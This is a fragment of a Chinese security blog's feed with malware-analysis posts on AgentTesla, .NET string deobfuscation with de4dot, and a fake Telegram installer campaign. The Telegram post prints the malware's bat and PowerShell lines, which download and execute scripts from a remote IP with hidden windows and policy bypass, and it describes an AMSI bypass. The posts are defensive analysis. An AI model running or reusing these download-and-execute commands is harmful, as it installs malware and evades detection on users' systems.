class="line">用于文件泄露的服务器</span><br><span class="line"></span><br><span class="line">pirnaram[.]xyz</span><br></pre></td></tr></table></figure><p>参考链接：<code>ttps://www.trendmicro.com/en_us/research/21/h/confucius-uses-pegasus-spyware-related-lures-to-target-pakistani.html</code><br><code>https://twitter.com/h2jazi/status/1439633168219480076</code><br><code>https://bazaar.abuse.ch/browse/tag/Confucius/</code></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>decrypting-obfuscated-net-malware-part-2</title>
      <link href="/decrypting-obfuscated-net-malware-part-2.html"/>
      <url>/decrypting-obfuscated-net-malware-part-2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/97ED5073471E2C9EFAC6706C7C6246EC.jpg"></p><span id="more"></span><p>信息窃取者agenttesla</p><h2 id="1-收集用户系统数据"><a href="#1-收集用户系统数据" class="headerlink" title="1.收集用户系统数据"></a>1.收集用户系统数据</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">时间、用户、<span class="meta">CPU</span>、内存、计算机名称、OSFullName</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630805895828.png"></p><h2 id="2-从这些l浏览器列表中中窃取凭据"><a href="#2-从这些l浏览器列表中中窃取凭据" class="headerlink" title="2.从这些l浏览器列表中中窃取凭据"></a>2.从这些l浏览器列表中中窃取凭据</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Opera, Comodo, Google Chrome, CocCoc, Chedot, Elements <span class="keyword">Browser, </span>Liebao, QIP Surf, <span class="keyword">Orbitum, </span>Sputnik, CentBrowser, Amigo, SRWare Iron, Torch, <span class="keyword">Brave, </span>Iridium, CoolNovo, <span class="number">7</span>Star, Epic Privacy <span class="keyword">Browser, </span><span class="number">360</span> Chrome, Yandex, QQBrowser , UCBrowser, Kometa, Sleipnir <span class="number">6</span>, Citrio, Coowon, uCozMedia, Vivaldi, Cyber​​Fox, IceCat, PaleMoon, Falkon <span class="keyword">Browser, </span>Flock <span class="keyword">Browser, </span>WaterFox, <span class="keyword">BlackHawk</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630805314641.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630805833614.png"></p><h2 id="3-FTP应用列表窃取凭据"><a href="#3-FTP应用列表窃取凭据" class="headerlink" title="3.FTP应用列表窃取凭据"></a>3.FTP应用列表窃取凭据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CoreFTP、SmartFTP、WS_FTP、FileZilla、cftp、FTPCommander、FTPGetter、WinScp 2、FlashFXP、FTP Navigator</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806127946.png"></p><h2 id="4-邮箱信息窃取"><a href="#4-邮箱信息窃取" class="headerlink" title="4.邮箱信息窃取"></a>4.邮箱信息窃取</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">IncrediMail</span>, <span class="title class_">Eudora</span>, <span class="title class_">Postbox</span>, <span class="title class_">ClawsMail</span>, <span class="title class_">ThunderBird</span>, <span class="title class_">TheBat</span>, <span class="title class_">Outlook</span>, <span class="title class_">OperaMail</span>, <span class="title class_">Pocomail</span>, <span class="title class_">Foxmail</span>, <span class="title class_">Psi</span>+</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806442234.png"></p><h2 id="5-聊天和消息应用程序"><a href="#5-聊天和消息应用程序" class="headerlink" title="5.聊天和消息应用程序"></a>5.聊天和消息应用程序</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Paltalk</span> Pidgin，Trillian</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806630346.png" alt="Paltalk Pidgin"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806659967.png" alt="Trillian"></p><h2 id="6-DNS-和-VPN-服务"><a href="#6-DNS-和-VPN-服务" class="headerlink" title="6.DNS 和 VPN 服务"></a>6.DNS 和 VPN 服务</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">DynDNS</span>、<span class="title class_">Vitalwerks</span>、<span class="title class_">OpenVPN</span>-<span class="variable constant_">GUI</span>、<span class="title class_">OpenVPN</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630808163184.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630808182848.png"></p><h2 id="7-下载器"><a href="#7-下载器" class="headerlink" title="7.下载器"></a>7.下载器</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806867295.png"></p><h2 id="8-攻击者其他信息"><a href="#8-攻击者其他信息" class="headerlink" title="8.攻击者其他信息"></a>8.攻击者其他信息</h2><p>该恶意软件使用 SMTP&#x2F;FTP&#x2F;WebPanel 来窃取被盗数据。</p><h3 id="8-1攻击者-SMTP-凭据"><a href="#8-1攻击者-SMTP-凭据" class="headerlink" title="8.1攻击者 SMTP 凭据"></a>8.1攻击者 SMTP 凭据</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807143464.png"></p><h3 id="8-2-可疑网页面板"><a href="#8-2-可疑网页面板" class="headerlink" title="8.2 可疑网页面板"></a>8.2 可疑网页面板</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807338520.png" alt="enter description here"></p><h3 id="8-3可疑的FTP-连接"><a href="#8-3可疑的FTP-连接" class="headerlink" title="8.3可疑的FTP 连接"></a>8.3可疑的FTP 连接</h3><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807526907.png"></p><h2 id="9-捕获屏幕截图和键盘记录"><a href="#9-捕获屏幕截图和键盘记录" class="headerlink" title="9.捕获屏幕截图和键盘记录"></a>9.捕获屏幕截图和键盘记录</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807719510.png"></p><h2 id="10-持久化"><a href="#10-持久化" class="headerlink" title="10.持久化"></a>10.持久化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WNRUXJ</span><br><span class="line">Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\\WNRUXJ</span><br><span class="line">%TEMP%\\tmpG[0–9]&#123;3&#125;</span><br></pre></td></tr></table></figure><h2 id="IOC如下"><a href="#IOC如下" class="headerlink" title="IOC如下"></a>IOC如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">lbIDo.exe 初始</span><br><span class="line"></span><br><span class="line">md5B163247FED5C1014F69E72C230235A22</span><br><span class="line">sha14F0F616DCEAA489E0CE112B02603DBC5D9540C07</span><br><span class="line">sha256BEC429A1F10445FA8ABA7DC9A4103BBAE69D5470C514221A0A87E6B9262CCC6A</span><br><span class="line"></span><br><span class="line">https://www.virustotal.com/gui/file/bec429a1f10445fa8aba7dc9a4103bbae69d5470c514221a0a87e6b9262ccc6a/details</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AndroidStudio.dll stager 1</span><br><span class="line"></span><br><span class="line">MD589cae80db18a87076fb59c2deff65b66</span><br><span class="line">SHA-18ba977317f5c661f81f5317f32ba50d3e8a129ba</span><br><span class="line">SHA-2564f717aaa0558a7bad3c9eb8d68d7e52a262670898586b4daaf1c0871ef1e1533</span><br><span class="line"></span><br><span class="line">https://www.virustotal.com/gui/file/4f717aaa0558a7bad3c9eb8d68d7e52a262670898586b4daaf1c0871ef1e1533/details</span><br><span class="line"></span><br><span class="line">Lazarus.exe stager 2</span><br><span class="line"></span><br><span class="line">MD50e4f9e496a1315780640d181cc3b9833</span><br><span class="line">SHA-132b1ba9d9b557abf88d09ebda9fc2e4073775792</span><br><span class="line">SHA-2565bb43d179f782e2e0df0a45c89876693e9c71ba5b69770305c9264bbb566c379</span><br><span class="line"></span><br><span class="line">https://www.virustotal.com/gui/file/5bb43d179f782e2e0df0a45c89876693e9c71ba5b69770305c9264bbb566c379/details</span><br><span class="line"></span><br><span class="line">NRMOeaUVVkwIAtJShsOH.exe 解密的字符串stager 3</span><br><span class="line"></span><br><span class="line">md54EF4497EC0AE0C98135E667E2A119DF4</span><br><span class="line">sha18665A6D4C44939B03E5E384B15B635A2914BE954</span><br><span class="line">sha256D26EB5E5EACB571F650A7991A4746FB4B785C8C625D36E8F0019A90B48855ACD</span><br><span class="line"></span><br><span class="line">DNS请求 </span><br><span class="line">域名 smtp.yandex.com</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://ghoulsec.medium.com/mal-series-9-c-agenttesla-infostealer-430d8cac505e">https://ghoulsec.medium.com/mal-series-9-c-agenttesla-infostealer-430d8cac505e</a><br><a href="https://www.youtube.com/watch?v=8L4hh5CG4nQ&t=364s">https://www.youtube.com/watch?v=8L4hh5CG4nQ&amp;t=364s</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>decrypting-obfuscated-net-malware-part1</title>
      <link href="/decrypting-obfuscated-net-malware-part-1.html"/>
      <url>/decrypting-obfuscated-net-malware-part-1.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/97ED5073471E2C9EFAC6706C7C6246EC.jpg"></p><span id="more"></span><h2 id="1-起因"><a href="#1-起因" class="headerlink" title="1.起因"></a>1.起因</h2><p>今天正好抽空整理一下前几个月看到阿三的分析视频。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630721969956.png"><br><a href="https://app.any.run/tasks/0f9b13ab-3efe-4ee1-abc1-a193db2bc33e/">https://app.any.run/tasks/0f9b13ab-3efe-4ee1-abc1-a193db2bc33e/</a></p><p> AgentTesla该恶意样本具有 3 层混淆和少量反分析技术的信息窃取器能够通过通过 SMTP 发送所有收集到的信息来窃取受害者的各种信息。<br>stager 的名称：</p><ol><li>IbIDo（包含有payload2 和 3 的加密stager）</li><li>AndroidStudio（解密payload 3）</li><li>Lazarus（最终payload之前包含少量反分析技术）</li><li>NRMOeaUVVkwIAtJShsOH（最终 AgentTesla payload)</li><li><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630741271800.png"><br>下面我们就开始分析各个阶段的stager</li></ol><h2 id="2-IbIDo"><a href="#2-IbIDo" class="headerlink" title="2.IbIDo"></a>2.IbIDo</h2><p> 拖入MV TBN CALL PORT FOR LOADING COAL_pdf.exe到pestudiom，可以看到在version种可以看到信息lbIDo.exe<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630722738659.png"><br> 再使用dnspy反编译调试工具进行分析与调试，找到ibiDO，进入man函数</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630724884619.png" alt=" "><br>跟进去找到main窗口，可以看到两个字符串<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630729629274.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630729736047.png"><br>那么我们回来再看看这个Secure1函数，双击跟进去看看。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630733493584.png"><br>在这我们可以看到资源的wpf像是做了base64解密，然后替换了字符串以及字符串翻转。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630733632696.png"><br>我们接着跟进到资源处，可以看到处理过的字符串<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630733843967.png"><br>那么我们对其使用CyberChef解密。得出第二阶段的payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734057491.png"><br>或在此处调试进行保存二进制文件即可<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734183152.png"><br>可以看到调用该第二阶段的payload的类<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734288828.png"></p><h2 id="3-AndroidStudio"><a href="#3-AndroidStudio" class="headerlink" title="3.AndroidStudio"></a>3.AndroidStudio</h2><p>我们可以看到到处保存的二进制文件为dll，同时也是C#编译的<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734572318.png"><br>继续进行分离payload的，在此处下的断点，运行后，快速进行暂停。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734943688.png"><br>停了之后，可以看到这里有个sleep函数，在该函数这里下个断点,然后步过<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630735751724.png"><br>我们在左侧可以看到调用的dll，然后我们依次进行步过<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630736332550.png"><br>只到788行进行单步，跟进去，再步过。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738394045.png"><br>单步后，可以看到array处熟悉pe头<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738476976.png"><br>保存导出使用pestudioj进行查看，发现是个exe文件，依旧还是c#编译的<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738668203.png"></p><h2 id="4-Lazarus"><a href="#4-Lazarus" class="headerlink" title="4.Lazarus"></a>4.Lazarus</h2><p>拖入dnspy种发现混淆比较严重。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738916020.png"><br>使用de4dot工具,进行脱壳反混淆操作<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739092376.png"><br>处理完混淆后的文件之后，我们进入main函数主体<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739250664.png"><br>下断点，然后一直步过。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739458038.png"><br>直到这里，进行单步。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739536417.png"><br>直到这里，进行单步。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739653415.png"><br>一直到这里，我们可以看到又是一个pe头。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739874834.png"><br>保存导出使用pestudioj进行查看，发现是个exe文件，依旧还是c#编译的，也是为最终 AgentTesla payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740068392.png"></p><h2 id="5-NRMOeaUVVkwIAtJShsOH"><a href="#5-NRMOeaUVVkwIAtJShsOH" class="headerlink" title="5.NRMOeaUVVkwIAtJShsOH"></a>5.NRMOeaUVVkwIAtJShsOH</h2><p>依旧拖入dnspy，查看main主体<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740282022.png"><br>在浏览代码时，我发现了很多对函数的引用’Module&gt;.\u0005’<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740443762.png"><br>看一下函数的定义，如下所示，表明它接受一个整数作为输入并返回一个字符串。所以混淆器在运行时使用这个函数来解码字符串。注意0x060000002我们在解密字符串时需要它的函数的令牌标识符。（单击红框处的module）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740619710.png"><br>现在切换到命令行并发出以下命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de4dot<span class="selector-class">.exe</span> <span class="number">1</span><span class="selector-class">.exe</span> <span class="attr">--strtyp</span> emulate <span class="attr">--strtok</span> <span class="number">0</span>x06000002</span><br></pre></td></tr></table></figure><p>–strtoki是我们上面确定的字符串解密函数的令牌。如果恶意软件使用多个函数来解密字符串，像这样指定所有函数</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de4dot file1.dll --strtyp delegate --strtok <span class="number">06012345</span> --strtok <span class="number">060</span>ABCDE</span><br></pre></td></tr></table></figure><p>其中–strtyp是要使用的字符串解密器的类型。de4dot 支持以下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">字符串解密器类型</span><br><span class="line">none 不要解密字符串</span><br><span class="line">default 使用默认的字符串解密器类型（通常是静态的）</span><br><span class="line">static 使用静态字符串解密器（如果可用）</span><br><span class="line">delegate 使用delegate调用真正的字符串解密器</span><br><span class="line">emulate 调用真正的字符串解密器并模拟某些指令</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740911497.png"><br>处理完毕的文件内容<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740969581.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630741029792.png"><br><strong>参考链接</strong>：<a href="https://www.youtube.com/watch?v=8L4hh5CG4nQ&t=1s">https://www.youtube.com/watch?v=8L4hh5CG4nQ&amp;t=1s</a><br><a href="https://medium.com/@irshaduetian/decrypting-obfuscated-net-malware-strings-using-de4dot-emulation-6614c5a03dab">https://medium.com/@irshaduetian/decrypting-obfuscated-net-malware-strings-using-de4dot-emulation-6614c5a03dab</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telegram恶意广告活动之恶意仓库分析</title>
      <link href="/Telegram%E6%81%B6%E6%84%8F%E5%B9%BF%E5%91%8A%E6%B4%BB%E5%8A%A8%E4%B9%8B%E6%81%B6%E6%84%8F%E4%BB%93%E5%BA%93%E5%88%86%E6%9E%90.html"/>
      <url>/Telegram%E6%81%B6%E6%84%8F%E5%B9%BF%E5%91%8A%E6%B4%BB%E5%8A%A8%E4%B9%8B%E6%81%B6%E6%84%8F%E4%BB%93%E5%BA%93%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-24.jpg" alt="1"></p><span id="more"></span><h3 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h3><p>Jeremy Kirk博主表示在搜索telegram的时候发现有一个有趣的广告</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-1.png" alt="1"></p><p>访问链接后，看起来像是telegram的官方网站，做的很逼真，但是其实就是钓鱼网站，当我们查看链接时，我们发现它用恶意软件替换了Windows二进制文件：</p><p>指向第三方的链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-2.png" alt="2"></p><p>查看证书，我们可以看到它们是由相同的CA在相同的时间范围内颁发的，这很可能使它们来自同一威胁参与者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://telegramdesktop.com/</span><br><span class="line">https://telegramdesktop.net/</span><br><span class="line">https://telegramdesktop.org/</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-3.png" alt="33"></p><p>当然在博主发完博文的后，我再次查看该网站，发现了它对链接也进行了替换。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-4.png" alt="4"></p><h3 id="2-bitbucker发现"><a href="#2-bitbucker发现" class="headerlink" title="2.bitbucker发现"></a>2.bitbucker发现</h3><p>在.com网站将其文件分发到bitbucker仓库中（github替代品）。访问仓库时，我们可以收集有关感染，操作日期以及其他恶意软件样本的一些信息：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-5.png" alt="5"></p><p>在该仓库发现如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/get/31a6a41f7711.zip</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/Crycker.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstallerX86.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/RuntimeBroker.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/rxr.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/zxc.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/SoftwareUpdate.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/Discord_x86_Setup.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.scr</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/DRX.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/SmartScreenUpdater.exe</span><br></pre></td></tr></table></figure><h3 id="3-powershell脚本分析"><a href="#3-powershell脚本分析" class="headerlink" title="3.powershell脚本分析"></a>3.powershell脚本分析</h3><p>同时在该仓库中发现一个提交者的仓库。</p><p><strong>本文就着重讲解在该提交者的仓库中的链接，我们从bat脚本更好的去入手分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/takax/1/downloads/TGInstaller.rar</span><br><span class="line">https://bitbucket.org/takax/1/downloads/TelegramInstaller.rar</span><br><span class="line">https://bitbucket.org/takax/1/downloads/RDP.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/TelegramInstaller.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/clr.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/12.bat</span><br></pre></td></tr></table></figure><h4 id="3-1-bat"><a href="#3-1-bat" class="headerlink" title="3.1 bat"></a>3.1 bat</h4><p>运行bat后，下载执行powershel脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 &amp;&amp; start &quot;&quot; /min &quot;%~dpnx0&quot; %* &amp;&amp; exit</span><br><span class="line">powershell -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQA0AC4AMQA1ADgALgAyADQANQAuADgAOAAvAG0AYQBlAC4AcABzADEAJwApAA==</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>base64 解码后为以下内容，执行下载mae。ps1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object Net.Webclient).downloadstring(&#x27;http://94.158.245.88/mae.ps1&#x27;)</span><br></pre></td></tr></table></figure><h4 id="3-2-mae-ps1"><a href="#3-2-mae-ps1" class="headerlink" title="3.2 mae.ps1"></a>3.2 mae.ps1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/start.vbs&quot;) | out-file $env:temp\start.vbs</span><br><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/Get-Content.ps1&quot;) | out-file $env:temp\Get-Content.ps1</span><br><span class="line">(New-Object Net.Webclient).downloadstring(&quot;http://94.158.245.88/mae/ready.ps1&quot;) | out-file $env:temp\ready.ps1</span><br><span class="line"></span><br><span class="line">start-process wscript -args &quot;$env:temp\start.vbs&quot;</span><br></pre></td></tr></table></figure><p>下载2个powerrshell脚本和1个vbs脚本。运行vbs脚本。最终三个脚本都是为了执行Get-Content.ps1</p><h4 id="3-3-start-vbs"><a href="#3-3-start-vbs" class="headerlink" title="3.3  start.vbs"></a>3.3  start.vbs</h4><p>通过WMI查看SMBiosData，反VM技术。如果成功，执行ready.ps1文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-6.png" alt="6"></p><h4 id="3-4-ready-ps1"><a href="#3-4-ready-ps1" class="headerlink" title="3.4 ready.ps1"></a>3.4 ready.ps1</h4><p>大体就是使用bypass amsi 去执行Get-Conten。ps1</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-7.png" alt="7"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-alias invokecommand expandstring invoke-expression AmsiScanBufferamsi.dll@¸W</span><br></pre></td></tr></table></figure><p>综上所述这四个文件都是为了Get-Conten。ps1这一个脚本而去服务的</p><p>下面我们来重点分析这个脚本。</p><h4 id="3-5-Get-Conten-ps1"><a href="#3-5-Get-Conten-ps1" class="headerlink" title="3.5 Get-Conten.ps1"></a>3.5 Get-Conten.ps1</h4><p>前面部分和ready。ps1相似，也是用来<strong>bypass  asmi</strong>的</p><p>但是<strong>func svcngnxjld 函数</strong> 是不同的，目的就是为了将其变量 <strong>$sotcschdvz</strong>的<strong>base64 payload</strong> 在变量 <strong>$swzsujyskx</strong>   <strong>三层字符串解密输出</strong>，  并 调用invoke-expression 进行执行</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-8.png" alt="8"></p><p>我们去掉最后一行 invoke-expression 字符串，让其输出**$swzsujyskx **  变量解密后的内容，还原被加密之前的内容</p><p>内容大体如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-9.png" alt="9"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-10.png" alt="10"></p><p>那么当我们去解码**$reg base64**时，发现该代码为乱码。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-11.png" alt="11"></p><p>那么我们发现**$reg命名为 $giruhabg** ，然后被<strong>func gogeoha31函数调用</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-12.png" alt="12"></p><p>那么我们可以看到<strong>func gogeoha31函数</strong> ，$low变量引起我们的注意，这个变是解密的关键。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-13.png" alt="13"></p><p>我们继续追踪到<strong>func pasgouta函数调用</strong> ,可以看到 其功能为xor解密，而key 为  <strong>“urueusj”</strong> </p><p>我们可以找到网上开源的powershell 脚本进行 xor加密与解密 </p><p><a href="https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7">https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-14.png" alt="14"></p><p>那么我们可以在CyberChef中加入xor的模块放入key，以及它还进行了 base64加密和gzip的压缩,然后再次使用base64加密，那么我们依次加入的模块为如下图所示，只需替换base64即可。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-15.png" alt="15"></p><p>那么我们依次对下图所示的几个变量进行解码，即可得到相对应的文件。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-16.png" 